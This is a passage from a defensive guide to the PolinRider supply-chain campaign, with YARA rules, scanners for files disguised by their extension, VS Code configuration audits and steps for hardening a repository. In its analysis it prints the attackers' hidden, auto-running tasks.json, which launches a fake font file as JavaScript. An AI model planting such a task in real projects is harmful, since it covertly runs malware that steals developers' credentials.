              return datetime.fromisoformat(s)
          result = subprocess.run(
              ['git', 'log', '--all', '--format=%H\t%ae\t%ai\t%ci\t%s'],
              capture_output=True, text=True
          )
          suspects = []
          for line in result.stdout.strip().split('\n'):
              parts = line.split('\t', 4)
              if len(parts) < 5: continue
              h, email, ad_str, cd_str, subject = parts
              try:
                  gap_hours = abs((parse_date(cd_str) - parse_date(ad_str)).total_seconds()) / 3600
                  if gap_hours > 168:
                      suspects.append(f"  {h[:12]} gap={gap_hours:.0f}h email={email} subject={subject[:50]}")
              except: pass
          if suspects:
              print("::warning::Commits with large author/committer date gaps (possible ForceMemo):")
              for s in suspects: print(s)
          else:
              print("Date gap check: CLEAN")
          PYEOF
      - name: Run YARA scan
        run: |
          cat > /tmp/polinrider.yar << 'YARARULES'
          rule PolinRider_V2 {
              strings:
                  $v = /global\[.{0,3}_V.{0,3}\]\s*=\s*.{0,3}8-(st)?\d{1,4}/
              condition: $v
          }
          rule BeaverTail_C2 {
              strings:
                  $t = "api.trongrid.io" ascii
                  $a = "fullnode.mainnet.aptoslabs.com" ascii
                  $b = "bsc-dataseed" ascii
              condition: any of them
          }
          rule Glassworm_Unicode {
              strings:
                  $zwsp = { E2 80 8B }
                  $zwj  = { E2 80 8D }
                  $vs1  = { EF B8 80 }
                  $rtlo = { E2 80 AE }
              condition: 2 of them and filename matches /\.(js|ts|mjs|py)$/i
          }
          rule FontPayload {
              strings:
                  $eval_buf = /eval\s*\(\s*Buffer\.from/ ascii
                  $var_hex  = "var _0x" ascii
              condition:
                  any of them
                  and filename matches /\.(woff2?|ttf|otf|png|jpg|ico)$/i
          }
          YARARULES
          find . -not -path '*/node_modules/*' -not -path '*/.git/*' -type f \
            \( -name '*.js' -o -name '*.ts' -o -name '*.mjs' -o -name '*.py' \
               -o -name '*.woff2' -o -name '*.woff' -o -name '*.ttf' \
               -o -name '*.png' -o -name '*.ico' \) \
            | xargs -r yara /tmp/polinrider.yar 2>/dev/null \
            && echo "::error::YARA match - PolinRider IOC confirmed" && exit 1 \
            || echo "YARA scan: CLEAN"
      - name: Summary
        if: success()
        run: |
          echo "All scans passed. Repository appears clean."
3.7 - Repository Hardening After Clean
# Enable GitHub's native secret scanning and push protection
gh api repos/OWNER/REPO -X PATCH \
    -F security_and_analysis='{
        "secret_scanning": {"status": "enabled"},
        "secret_scanning_push_protection": {"status": "enabled"},
        "dependabot_security_updates": {"status": "enabled"}
    }'
# Configure branch protection on main
gh api repos/OWNER/REPO/branches/main/protection -X PUT \
    --input - << 'EOF'
{
    "required_status_checks": {
        "strict": true,
        "contexts": ["scan / IOC scan"]
    },
    "enforce_admins": true,
    "required_pull_request_reviews": {
        "required_approving_review_count": 1,
        "dismiss_stale_reviews": true
    },
    "restrictions": null,
    "required_linear_history": true,
    "allow_force_pushes": false,
    "allow_deletions": false
}
EOF
# Audit collaborators
gh api repos/OWNER/REPO/collaborators --paginate | \
    jq '.[] | {login: .login, role: .role_name, permission: .permissions}'
# Audit webhooks - attackers add hooks to forward push events to C2
gh api repos/OWNER/REPO/hooks | \
    jq '.[] | {id: .id, url: .config.url, active: .active, events: .events}'
# Create a security advisory to notify downstream users
gh api repos/OWNER/REPO/security-advisories -X POST \
    -f summary="Repository compromised by PolinRider supply-chain campaign (DPRK/Lazarus)" \
    -f description="Between [START_DATE] and [END_DATE] this repository contained a malicious payload injected by the PolinRider campaign. If you cloned or forked this repository during that window, please see https://github.com/OpenSourceMalware/PolinRider for full IOCs and remediation steps." \
    -f severity="critical"

---

Part 4: The Font-File Vector - Filling the Gap in Extension-Based Scanning
For all readers - this section documents a confirmed PolinRider attack vector that the tools in Parts 1 through 3 do not fully address, and explains the design principle that will keep your defences relevant as the malware evolves.
The Incident That Exposed the Gap
A developer opens their project in VS Code. No prompts. No warnings. The terminal panel flickers for a fraction of a second, then closes. Everything looks normal.
Somewhere in the background, a detached Node.js process has just read an encrypted instruction set from the TRON blockchain, decrypted it with an XOR key, and executed a credential-harvesting second stage. The developer's GitHub token, SSH agent, and environment variables are being exfiltrated. They will not know anything happened until their repositories start behaving strangely - branches wiped, history falsified, commits they never wrote appearing in their git log.
The entry point for all of this was a folder that looked completely harmless: public/fonts/fa-solid-400.woff2.
This is not a hypothetical. It is a confirmed attack pattern from the PolinRider campaign, and it is the most instructive example of why extension-based scanning creates a false sense of security. The file looked like a FontAwesome icon font. It had the right directory structure. It had the right filename. It was not a font.
Why Node.js Does Not Care About Extensions
The insight is deceptively simple: Node.js determines what to do with a file based entirely on the content, not the name. When you run node ./some-file.woff2, Node reads the file bytes, treats them as JavaScript source code, and executes them. The .woff2 extension is purely a human convention - it carries no meaning to the runtime. The operating system does not enforce it. The JavaScript engine does not check it.
This has an important implication for every scanner built so far. The grep scans in Part 1 search for eval(Buffer.from in *.js and *.mjs files - they will never see that string inside fa-solid-400.woff2. The YARA rules in Part 3 that match filename matches /\.(js|mjs|ts)$/i skip the fonts directory entirely. Even a human reviewer looking at a git diff will see a new binary file added in public/fonts/ and mentally categorise it as a static asset, not executable code.
The attacker knew this. The choice of a FontAwesome filename was deliberate. FontAwesome's fa-solid-400.woff2 is one of the most common font files in web development - it appears in millions of projects. A reviewer's pattern-matching brain sees "FontAwesome font file" and moves on.
The Complete Attack Chain
Looking at the tasks.json that was injected, the complete mechanism becomes clear.
{
  "label": "eslint-check",
  "type": "shell",
  "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-400.woff2) || (where node >nul 2>&1 && node ./public/fonts/fa-solid-400.woff2) || echo ''",
  "problemMatcher": [],
  "isBackground": true,
  "hide": true,
  "presentation": {
    "reveal": "never",
    "panel": "dedicated",
    "focus": false,
    "clear": false,
    "echo": false,
    "close": true
  },
  "runOptions": {
    "runOn": "folderOpen"
  }
}
Every element of this configuration was chosen with precision. The label "eslint-check" is social engineering at the configuration level: if a developer ever inspects the task list, they see what appears to be a standard linting task. The cross-platform command wrapper handles Unix, macOS, and Windows, because the attacker is targeting the widest possible developer population. The || echo '' at the end ensures the task always exits with code zero so VS Code never shows an error.
The "runOn": "folderOpen" is the trigger that makes this so dangerous. This fires automatically when the project folder is opened - before npm install, before the developer has run a single command, before any other hook can fire. The presentation block - "reveal": "never", "echo": false, "close": true - suppresses all visual evidence of execution. The "hide": true flag removes the task from the VS Code task picker UI entirely. A developer opening this project would have no indication that anything ran at all.
Together, this is one of the most carefully engineered stealth execution setups in the PolinRider campaign: zero user interaction required, zero visible traces, working across all three major operating systems.
The Core Lesson: Extension Is a Trust Model, Not a Security Model
Before moving to the new tooling, this lesson deserves to be stated clearly because it is the principle that will keep your defences relevant as the malware evolves.
Every scanner that decides whether to inspect a file based on its extension is trusting the attacker to have named the file honestly. That is not a security model - it is an optimistic convention. PolinRider exploited this assumption with precision. The correct mental model is: the extension tells you what the file is intended to be; the content tells you what it actually is. Both checks are necessary, and content must win in any conflict between them.
As PolinRider variants evolve, the specific extensions used as camouflage will change. Tomorrow it might be an .svg file, or a .json configuration file, or a .wasm module, or a minified .css file. The individual extension does not matter. What matters is whether the file's actual content matches what the extension promises. That question never goes out of date.
4.1 - Content-Based File Scanning
The fix for extension-blind payloads is to scan files based on their actual content. The file command on Unix systems does this: it reads the first few bytes (the "magic bytes") of a file and determines its true type from the data, not the name.
A real WOFF2 font file always starts with the four-byte magic signature wOF2 - bytes 77 4F 46 32 in hex. A JavaScript file disguised as a WOFF2 will start with JavaScript syntax: typically a parenthesis, a variable declaration, an IIFE pattern, or sometimes just an identifier. This difference is detectable with a single command.
#!/bin/bash
# scan-disguised-files.sh
# Finds files whose actual content type does not match their extension.
# This catches JavaScript payloads disguised as fonts, images, or other binary formats.
# The extension list is intentionally broad: as new disguise extensions are adopted
# by future variants, add them to the case block below.
#
# Usage: ./scan-disguised-files.sh /path/to/repo
# Requires: the 'file' command (standard on macOS and Linux)
REPO="${1:-.}"
ISSUES=0
echo "=== Content-type mismatch scan: $REPO ==="
echo "Looking for files whose content does not match their extension..."
echo ""
while IFS= read -r -d '' filepath; do
    filename=$(basename "$filepath")
    extension="${filename##*.}"
    extension_lower=$(echo "$extension" | tr '[:upper:]' '[:lower:]')
    true_type=$(file --brief --mime-type "$filepath" 2>/dev/null)
    # Expected MIME type prefixes for binary extensions.
    # Add new extensions here as future variants adopt new disguise formats.
    case "$extension_lower" in
        woff|woff2)   expected_mime="font/"        ;;
        ttf|otf|eot)  expected_mime="font/"        ;;
        png)          expected_mime="image/png"    ;;
        jpg|jpeg)     expected_mime="image/jpeg"   ;;
        gif)          expected_mime="image/gif"    ;;
        svg)          continue                      ;; # SVG is legitimately text/xml
        webp)         expected_mime="image/webp"   ;;
        pdf)          expected_mime="application/pdf" ;;
        zip|jar)      expected_mime="application/zip" ;;
        wasm)         expected_mime="application/wasm" ;; # WebAssembly future vector
        *)            continue                     ;;
    esac
    # Flag if a "binary" extension file is actually text or JavaScript
    if [[ "$true_type" == "text/"* || "$true_type" == "application/javascript"* ]]; then
        echo "SUSPICIOUS: $filepath"
        echo "  Extension claims: .$extension_lower"
        echo "  Actual content:   $true_type"
        filesize=$(wc -c < "$filepath" 2>/dev/null || echo 0)
        if [[ "$filesize" -lt 512000 ]]; then
            echo "  First 120 bytes of content:"
            head -c 120 "$filepath" 2>/dev/null | cat -v
            echo ""
        fi
        ((ISSUES++))
    fi
done < <(find "$REPO" \
    -not -path "*/.git/*" \
    -not -path "*/node_modules/*" \
    -type f -print0)
echo ""
if [[ "$ISSUES" -eq 0 ]]; then
    echo "CLEAN: All binary files have content matching their extension."
else
    echo "FOUND $ISSUES file(s) with content/extension mismatches."
    echo "Each of these should be manually inspected before opening the project."
fi
Against the compromised project, this would have produced:
SUSPICIOUS: ./public/fonts/fa-solid-400.woff2
  Extension claims: .woff2
  Actual content:   text/javascript
  First 120 bytes of content:
  (function(){var _0x...
That output - text/javascript for a .woff2 file - is unambiguous. The file is not a font.
4.2 - Deep Entropy-Based Binary Payload Scanner
Some payloads are encoded in ways that file still reports as "binary" - for example, a base64-encoded JavaScript payload stored inside a WOFF2 wrapper with the correct magic bytes prepended. For those cases, we need a deeper scan: check the textual content and entropy signature inside binary-named files.
Most legitimate font and image files contain very few printable ASCII characters in sequence. A JavaScript payload, even an obfuscated one, contains long runs of printable characters: function names, base64 strings, bracket sequences, and string literals. We can use this entropy difference as a detection signal.
#!/usr/bin/env python3
# scan-binary-payloads.py
# Scans binary-extension files for suspiciously high densities of
# printable ASCII text, wrong magic bytes, and JS keyword signatures.
#
# This catches:
#   - JavaScript disguised as .woff2, .png, .gif, etc.
#   - Base64-encoded payloads in binary files
#   - Text payloads with correct binary headers prepended (magic-byte spoofing)
#
# EXTENSIBILITY: To add new binary extensions for future variants, add them
# to BINARY_EXTENSIONS and, where applicable, to MAGIC_BYTES.
#
# Usage: python3 scan-binary-payloads.py [directory]
import os
import sys
import math
from pathlib import Path
# Extensions expected to be binary. Extend this as new disguise formats emerge.
BINARY_EXTENSIONS = {
    '.woff', '.woff2', '.ttf', '.otf', '.eot',   # fonts
    '.png', '.jpg', '.jpeg', '.gif', '.webp',     # images
    '.ico', '.bmp',                               # icons
    '.pdf', '.zip', '.tar', '.gz',               # archives/docs
    '.exe', '.dll', '.so', '.dylib',              # native binaries
    '.mp3', '.mp4', '.wav', '.ogg',              # media
    '.wasm',                                      # WebAssembly
}
# Known magic byte signatures.
# A file missing these is likely disguised. Extend as needed.
MAGIC_BYTES = {
    '.woff2': (0, b'wOF2'),
    '.woff':  (0, b'wOFF'),
    '.ttf':   (0, b'\x00\x01\x00\x00'),
    '.otf':   (0, b'OTTO'),
    '.png':   (0, b'\x89PNG'),
    '.jpg':   (0, b'\xff\xd8\xff'),
    '.jpeg':  (0, b'\xff\xd8\xff'),
    '.gif':   (0, b'GIF8'),
    '.pdf':   (0, b'%PDF'),
    '.zip':   (0, b'PK\x03\x04'),
    '.wasm':  (0, b'\x00asm'),
}
def calculate_printable_ratio(data: bytes) -> float:
    """
    Ratio of printable ASCII bytes in the file.
    Legitimate binary files typically score below 0.3.
    JavaScript/text files typically score above 0.7.
    Obfuscated code often scores 0.5–0.9.
    """
    if not data:
        return 0.0
    printable = sum(1 for b in data if 32 <= b <= 126 or b in (9, 10, 13))
    return printable / len(data)
def check_magic_bytes(filepath: Path, ext: str) -> bool:
    if ext not in MAGIC_BYTES:
        return True
    offset, expected = MAGIC_BYTES[ext]
    try:
        with open(filepath, 'rb') as f:
            f.seek(offset)
            actual = f.read(len(expected))
        return actual == expected
    except (IOError, OSError):
        return True
def calculate_byte_entropy(data: bytes) -> float:
    """
    Shannon entropy of byte distribution.
    Real binary files (compressed/encrypted): entropy > 7.5.
    Font files: entropy around 5.0–7.0.
    JavaScript source code: entropy around 4.0–5.5.
    Base64-encoded payloads: entropy around 5.5–6.0.
    """
    if not data:
        return 0.0
    counts = [0] * 256
    for byte in data:
        counts[byte] += 1
    entropy = 0.0
    length = len(data)
    for count in counts:
        if count > 0:
            p = count / length
            entropy -= p * math.log2(p)
    return entropy
def scan_file(filepath: Path) -> dict | None:
    ext = filepath.suffix.lower()
    if ext not in BINARY_EXTENSIONS:
        return None
    try:
        with open(filepath, 'rb') as f:
            data = f.read(65536)  # 64KB is enough for payload detection
    except (IOError, OSError, PermissionError):
        return None
    if not data:
        return None
    findings = {}
    suspicious = False
    # Check 1: Magic bytes
    if not check_magic_bytes(filepath, ext):
        findings['magic_mismatch'] = True
        suspicious = True
    # Check 2: Printable character ratio
    printable_ratio = calculate_printable_ratio(data)
    if printable_ratio > 0.6:
        findings['printable_ratio'] = round(printable_ratio, 3)
        suspicious = True
    elif printable_ratio > 0.4:
        findings['printable_ratio_warning'] = round(printable_ratio, 3)
    # Check 3: Byte entropy - low entropy in a "binary" file means readable content
    entropy = calculate_byte_entropy(data)
    if entropy < 4.5 and len(data) > 1000:
        findings['low_entropy'] = round(entropy, 2)
        suspicious = True
    # Check 4: JavaScript keyword density
    js_keywords = [b'function', b'require(', b'module.', b'exports',
                   b'eval(', b'Buffer.from', b'process.env', b'child_process']
    keyword_hits = [kw.decode() for kw in js_keywords if kw in data]
    if keyword_hits:
        findings['js_keywords'] = keyword_hits
        suspicious = True
    if not suspicious:
        return None
    return {
        'path': str(filepath),
        'size': len(data),
        'findings': findings,
        'first_bytes_printable': data[:80].decode('ascii', errors='replace').strip()
    }
def scan_directory(root: str) -> list:
    results = []
    skip_dirs = {'.git', 'node_modules', '__pycache__', '.next', 'dist', 'build'}
    for dirpath, dirnames, filenames in os.walk(root):
        dirnames[:] = [d for d in dirnames if d not in skip_dirs]
        for filename in filenames:
            filepath = Path(dirpath) / filename
            result = scan_file(filepath)
            if result:
                results.append(result)
    return results
def main():
    target = sys.argv[1] if len(sys.argv) > 1 else '.'
    print(f"Scanning binary files for embedded payloads in: {target}\n")
    findings = scan_directory(target)
    if not findings:
        print("CLEAN: All binary-extension files appear to be genuine binary content.")
        return 0
    print(f"{'='*60}")
    print(f"SUSPICIOUS FILES: {len(findings)} finding(s)")
    print(f"{'='*60}\n")
    for f in findings:
        print(f"File:    {f['path']}")
        print(f"Size:    {f['size']:,} bytes")
        for key, value in f['findings'].items():
            if key == 'magic_mismatch':
                ext = Path(f['path']).suffix.lower()
                expected = MAGIC_BYTES.get(ext, (0, b'?'))
                print(f"  MAGIC BYTES WRONG - file does not start with {expected[1]} signature for {ext}")
            elif key == 'printable_ratio':
                print(f"  {value*100:.0f}% printable ASCII - this 'binary' file reads like code")
            elif key == 'printable_ratio_warning':
                print(f"  {value*100:.0f}% printable ASCII - unusual for a binary file, review manually")
            elif key == 'low_entropy':
                print(f"  Low byte entropy ({value}) - compressed/encrypted binary expected higher")
            elif key == 'js_keywords':
                print(f"  JavaScript keywords found inside binary file: {', '.join(value)}")
        print(f"  First 80 bytes: {f['first_bytes_printable']}")
        print()
    return 1
if __name__ == '__main__':
    sys.exit(main())
4.3 - Extended VS Code Config Audit with Payload Resolution
The scan-vscode-config.sh script in Part 2 flags suspicious commands in tasks.json, but it does not follow the file path references. The extended version below resolves any file path arguments to node and checks whether the referenced file is actually JavaScript.
#!/bin/bash
# scan-vscode-deep.sh - extended VS Code configuration auditor
# Flags suspicious tasks AND resolves file path arguments to check their
# true content type. Catches the "node ./public/fonts/payload.woff2" pattern.
#
# Usage: ./scan-vscode-deep.sh /path/to/repo
REPO="${1:-.}"
TASKS_FILE="$REPO/.vscode/tasks.json"
SETTINGS_FILE="$REPO/.vscode/settings.json"
ISSUES=0
echo "=== Deep .vscode/ audit: $REPO ==="
echo ""
# ---- 1. Check workspace settings ----
if [[ -f "$SETTINGS_FILE" ]]; then
    echo "--- Checking settings.json ---"
    AUTO_TASKS=$(grep -n "allowAutomaticTasks" "$SETTINGS_FILE" | grep -i "true" || true)
    if [[ -n "$AUTO_TASKS" ]]; then
        echo "  WARNING: task.allowAutomaticTasks is enabled"
        echo "  This allows tasks with runOn:folderOpen to execute without any user prompt."
        echo "  Line: $AUTO_TASKS"
        ((ISSUES++))
    fi
    SHELL_OVERRIDE=$(grep -nE \
        "terminal.integrated.shell|terminal.integrated.defaultProfile|terminal.integrated.profiles" \
        "$SETTINGS_FILE" 2>/dev/null || true)
    if [[ -n "$SHELL_OVERRIDE" ]]; then
        echo "  WARNING: workspace settings override the terminal shell:"
        echo "  $SHELL_OVERRIDE"
        ((ISSUES++))
    fi
    echo ""
fi
# ---- 2. Audit tasks.json ----
if [[ ! -f "$TASKS_FILE" ]]; then
    echo "No tasks.json found - safe to open."
    exit 0
fi
echo "--- Checking tasks.json ---"
cat "$TASKS_FILE"
echo ""
# Check for folder-open auto-execution
grep -q "folderOpen" "$TASKS_FILE" 2>/dev/null && \
    { echo "  WARNING: task with runOn:folderOpen detected - runs automatically on folder open"; ((ISSUES++)); }
# Check for hidden task
grep -q '"hide".*true' "$TASKS_FILE" 2>/dev/null && \
    { echo "  WARNING: task marked hide:true - does not appear in task picker"; ((ISSUES++)); }
# Check for suppressed terminal output
grep -qE '"reveal".*"never"|"echo".*false' "$TASKS_FILE" 2>/dev/null && \
    { echo "  WARNING: task configured to hide terminal output"; ((ISSUES++)); }
# ---- 3. Resolve and inspect node invocation targets ----
echo ""
echo "--- Resolving file arguments in task commands ---"
REPO="$REPO" python3 << 'PYEOF'
import json, os, subprocess, sys, re
tasks_path = os.path.join(os.environ.get('REPO', '.'), '.vscode', 'tasks.json')
issues = 0
try:
    with open(tasks_path) as f:
        content = f.read()
    content = re.sub(r',(\s*[}\]])', r'\1', content)  # strip trailing commas
    data = json.loads(content)
except Exception as e:
    print(f"  Could not parse tasks.json: {e}")
    sys.exit(0)
RUNTIMES = ['node', 'python', 'python3', 'ruby', 'perl', 'php', 'deno']
repo_root = os.environ.get('REPO', '.')
for task in data.get('tasks', []):
    label = task.get('label', 'unnamed')
    command = task.get('command', '')
    if not command:
        continue
    for runtime in RUNTIMES:
        if runtime not in command:
            continue
        path_matches = re.findall(
            r'(?:^|&&|\|\||\s)' + re.escape(runtime) + r'\s+([\./][^\s;|&>)]+)',
            command
        )
        for path_arg in path_matches:
            full_path = os.path.join(repo_root, path_arg.lstrip('./'))
            if not os.path.exists(full_path):
                print(f"  Task '{label}': {runtime} references non-existent file: {path_arg}")
                continue
            try:
                result = subprocess.run(
                    ['file', '--brief', '--mime-type', full_path],
                    capture_output=True, text=True
                )
                true_type = result.stdout.strip()
            except FileNotFoundError:
                true_type = 'unknown (file command not available)'
            ext = os.path.splitext(path_arg)[1].lower()
            print(f"  Task '{label}': {runtime} executes: {path_arg}")
            print(f"    Extension: {ext or '(none)'}")
            print(f"    Actual content type: {true_type}")
            suspicious_ext = ext in ('.woff', '.woff2', '.ttf', '.otf', '.png',
                                     '.jpg', '.gif', '.ico', '.mp3', '.zip', '.pdf', '.wasm')
            is_text = 'text' in true_type or 'javascript' in true_type
            if suspicious_ext and is_text:
                print(f"    *** CRITICAL: Binary-extension file contains text/code")
                print(f"    *** This is the PolinRider font-disguise technique")
                issues += 1
            elif ext not in ('.js', '.mjs', '.cjs', '.ts', '.py', '.rb'):
                print(f"    NOTE: Non-standard extension for {runtime} - review manually")
if issues > 0:
    sys.exit(1)
PYEOF
PYEOF_EXIT=$?
if [[ $PYEOF_EXIT -ne 0 ]]; then
    ((ISSUES++))
fi
echo ""
echo "========================================"
if [[ "$ISSUES" -eq 0 ]]; then
    echo "CLEAN: No suspicious .vscode/ configurations found."
else
    echo "ISSUES FOUND: $ISSUES concern(s)"
    echo ""
    echo "Recommended action:"
    echo "  Open in Restricted Mode first: code --disable-extensions $REPO"
    echo "  Or delete .vscode/tasks.json before opening."
fi
echo "========================================"
4.4 - Extending the git History Scanner to Include Binary Files
The triage-repos.sh from Part 1 searches git diff content for IOC strings, but git marks binary files as "Binary files differ" in the diff output - meaning their content is never searched. The --text flag forces git to treat all files as text, making binary-named payloads searchable in history.
# Scan git history INCLUDING the content of binary-extension files.
# --text forces git to show content even for files it considers binary.
git log --all -p --text \
    -- '*.woff2' '*.woff' '*.ttf' '*.otf' '*.png' '*.ico' \
    2>/dev/null | \
    grep -E \
    "eval\(Buffer|trongrid|aptos|bsc-dataseed|function.*_0x|var _0x[0-9a-f]" | \
    head -20
# Also scan binary-extension files currently in the working tree
# for JavaScript content, regardless of git history
find . \
    -not -path '*/.git/*' \
    -not -path '*/node_modules/*' \
    \( -name '*.woff2' -o -name '*.woff' -o -name '*.ttf' \
       -o -name '*.png' -o -name '*.ico' -o -name '*.gif' \) \
    -type f | while read -r f; do
        TRUE_TYPE=$(file --brief --mime-type "$f" 2>/dev/null)
        if [[ "$TRUE_TYPE" == "text/"* || "$TRUE_TYPE" == "application/javascript"* ]]; then
            echo "PAYLOAD: $f (content: $TRUE_TYPE)"
            head -c 200 "$f"
            echo ""
        fi
    done
4.5 - The Complete Pre-Open Checklist
Before opening any cloned repository in VS Code - especially from an unfamiliar source, a fork, a recruiter, or a new collaborator - run these five checks in order. The pre-open step is the highest-leverage defensive action you can take because it prevents execution before a single line of malware has run.

#!/bin/bash
# pre-open-check.sh - The Complete Cross-Platform Pre-Open Security Audit
# Scans working tree, VS Code configs, binary files, and all historical Git branches.
#
# Usage: ./pre-open-check.sh /path/to/cloned-repo

REPO="${1:-.}"
FAIL=0

echo "========================================"
echo "PRE-OPEN SECURITY AUDIT (FULL COVERAGE)"
echo "Target: $REPO"
echo "========================================"
echo ""

# Helper to find relevant source files safely without brittle grep inclusions
find_source_files() {
    find "$REPO" -type d \( -name ".git" -o -name "node_modules" \) -prune -o \
    -type f -regextype posix-extended -iregex '.*\.(js|mjs|cjs|ts|tsx|jsx|json)$' -print0
}

# ---------------------------------------------------------
# Check 1: Binary files with text content (MIME mismatch)
# ---------------------------------------------------------
echo "[1/6] Scanning binary-extension files for embedded code..."
BINARY_HITS=$(find "$REPO" -type d \( -name ".git" -o -name "node_modules" \) -prune -o \
    -type f -regextype posix-extended -iregex '.*\.(woff2?|ttf|otf|png|jpg|jpeg|ico|wasm|gif)$' -print0 | \
    while IFS= read -r -d '' f; do
        TRUE_TYPE=$(file --brief --mime-type "$f" 2>/dev/null)
        if [[ "$TRUE_TYPE" == "text/"* || "$TRUE_TYPE" == "application/javascript"* ]]; then
            echo "$f ($TRUE_TYPE)"
        fi
    done)

if [[ -n "$BINARY_HITS" ]]; then
    echo "  FAIL: Binary files with text/code content:"
    echo "$BINARY_HITS" | sed 's/^/    /'
    FAIL=1
else
    echo "  PASS"
fi

# ---------------------------------------------------------
# Check 2: VS Code task configuration (TasksJacker)
# ---------------------------------------------------------
echo ""
echo "[2/6] Auditing .vscode/tasks.json..."
if [[ -f "$REPO/.vscode/tasks.json" ]]; then
    TASK_ISSUES=0
    # POSIX regex check for auto-run and binary execution
    if grep -q "folderOpen" "$REPO/.vscode/tasks.json"; then
        echo "  FAIL: task with runOn:folderOpen"
        TASK_ISSUES=1; FAIL=1
    fi
    if grep -E -q 'node[[:space:]]+[^"'\'']*\.(woff2?|ttf|png|jpg|ico|gif|wasm)' "$REPO/.vscode/tasks.json"; then
        echo "  FAIL: node executing a binary-extension file"
        TASK_ISSUES=1; FAIL=1
    fi
    if grep -q '"hide"[[:space:]]*:[[:space:]]*true' "$REPO/.vscode/tasks.json"; then
        echo "  WARN: task with hide:true"
        TASK_ISSUES=1
    fi
    [[ "$TASK_ISSUES" -eq 0 ]] && echo "  PASS"
else
    echo "  PASS (no tasks.json)"
fi

# ---------------------------------------------------------
# Check 3: PolinRider Text IOC Scan (Working Tree)
# ---------------------------------------------------------
echo ""
echo "[3/6] Scanning working tree source files for PolinRider IOCs..."
IOC_HITS=$(find_source_files | xargs -0 grep -E -n \
    "global\[.{0,5}_V.{0,5}\].*8-|eval[[:space:]]*\([[:space:]]*Buffer\.from|trongrid\.io|bsc-dataseed")

if [[ -n "$IOC_HITS" ]]; then
    echo "  FAIL: PolinRider IOC in source files:"
    echo "$IOC_HITS" | head -10 | sed 's/^/    /'
    FAIL=1
else
    echo "  PASS"
fi

# ---------------------------------------------------------
# Check 4: Invisible Unicode (Glassworm) via Python
# ---------------------------------------------------------
echo ""
echo "[4/6] Scanning for invisible Unicode characters (Glassworm)..."
UNICODE_RESULT=$(python3 - "$REPO" << 'PYEOF'
import os, sys
SUSPICIOUS_RANGES = [
    (0x200B, 0x200F), (0x202A, 0x202E), (0x2060, 0x2064),
    (0xFE00, 0xFE0F), (0xE000, 0xF8FF), (0xFEFF, 0xFEFF),
]
def is_suspicious(cp):
    return any(lo <= cp <= hi for lo, hi in SUSPICIOUS_RANGES)

root = sys.argv[1]
hits = []
for dirpath, dirnames, filenames in os.walk(root):
    dirnames[:] = [d for d in dirnames if d not in ('.git', 'node_modules')]
    for fname in filenames:
        if not fname.endswith(('.js', '.ts', '.mjs', '.cjs', '.jsx', '.tsx', '.json')):
            continue
        fpath = os.path.join(dirpath, fname)
        try:
            with open(fpath, encoding='utf-8', errors='replace') as f:
                for i, line in enumerate(f, 1):
                    suspicious = [c for c in line if is_suspicious(ord(c))]
                    if suspicious:
                        hits.append(f"{fpath}:{i} ({len(suspicious)} hidden chars)")
        except Exception:
            pass
if hits:
    for h in hits: print(h)
    sys.exit(1)
PYEOF
)
if [[ $? -ne 0 && -n "$UNICODE_RESULT" ]]; then
    echo "  FAIL: Invisible Unicode in source files:"
    echo "$UNICODE_RESULT" | sed 's/^/    /'
    FAIL=1
else
    echo "  PASS"
fi

# ---------------------------------------------------------
# Check 5: Entropy Scan on Binary Files (Deep Obfuscation)
# ---------------------------------------------------------
echo ""
echo "[5/6] Running entropy analysis on binary-extension files..."
ENTROPY_RESULT=$(python3 - "$REPO" << 'PYEOF'
import os, sys
from pathlib import Path

BINARY_EXTENSIONS = {'.woff', '.woff2', '.ttf', '.otf', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.wasm'}

def printable_ratio(data):
    if not data: return 0.0
    return sum(1 for b in data if 32 <= b <= 126 or b in (9, 10, 13)) / len(data)

root = sys.argv[1]
hits = []
for dirpath, dirnames, filenames in os.walk(root):
    dirnames[:] = [d for d in dirnames if d not in ('.git', 'node_modules')]
    for fname in filenames:
        ext = Path(fname).suffix.lower()
        if ext not in BINARY_EXTENSIONS: continue
        fpath = os.path.join(dirpath, fname)
        try:
            with open(fpath, 'rb') as f:
                data = f.read(65536)
            ratio = printable_ratio(data)
            if ratio > 0.6:
                hits.append(f"{fpath} (printable ratio: {ratio:.0%})")
        except Exception:
            pass

if hits:
    for h in hits: print(h)
    sys.exit(1)
PYEOF
)
if [[ $? -ne 0 && -n "$ENTROPY_RESULT" ]]; then
    echo "  FAIL: High printable-character ratio in binary files:"
    echo "$ENTROPY_RESULT" | sed 's/^/    /'
    FAIL=1
else
    echo "  PASS"
fi

# ---------------------------------------------------------
# Check 6: All-Branch Git History Scan (The Safety Net)
# ---------------------------------------------------------
echo ""
echo "[6/6] Scanning all branches and history for IOCs..."
if [ -d "$REPO/.git" ]; then
    # --text forces git to search inside binary files across all commits
    HISTORY_HITS=$(git -C "$REPO" log --all -p --text 2>/dev/null | \
        grep -E "global\[.{0,5}_V.{0,5}\].*8-|eval[[:space:]]*\([[:space:]]*Buffer\.from|trongrid\.io|bsc-dataseed" | head -5)
    
    if [[ -n "$HISTORY_HITS" ]]; then
        echo "  FAIL: PolinRider IOC found hidden in another branch or past commit:"
        echo "$HISTORY_HITS" | sed 's/^/    /'
        FAIL=1
    else
        echo "  PASS"
    fi
else
    echo "  PASS (Not a git repository)"
fi

# ---------------------------------------------------------
# Final Verdict
# ---------------------------------------------------------
echo ""
echo "========================================"
if [[ "$FAIL" -eq 0 ]]; then
    echo "ALL CHECKS PASSED - Safe to open in VS Code."
else
    echo "CHECKS FAILED - DO NOT OPEN."
    echo "Run code --disable-extensions $REPO if manual review is required."
fi
echo "========================================"
exit $FAIL

---

The Operational Sequence: How the Three Parts Work Together
Now that all four parts are in front of you, it is worth making the relationship between them explicit, because they address distinct phases of the same attack lifecycle.
The tools in Part 4 and the pre-open checklist operate earliest - they detect and prevent the initial execution that enables everything else. If you run pre-open-check.sh before opening a cloned project, you never execute the .woff2 payload. If the payload never executes, your GitHub token is never harvested. If your token is never harvested, the ForceMemo branch-wipe never happens.
The tools in Parts 1 and 3 operate after the fact - they detect an existing infection, find exactly which commit introduced it, and surgically remove it from history. The triage report from Part 1 feeds directly into the batch cleaner from Part 3.
The hardening steps in Parts 2 and 3 (sandbox profiles, git hooks, CI workflow, branch protection) form the persistent layer - they catch anything that slips past the pre-open check in the future, and they make the environment measurably harder to infect even if the malware evolves.
And for repositories where the ForceMemo force-push has already wiped branches before you could intervene, the GitHub Events API recovery approach documented in Surviving PolinRider by Karo Edaware addresses that specific situation - you have roughly 48 hours before GitHub garbage-collects the orphaned commits.

---

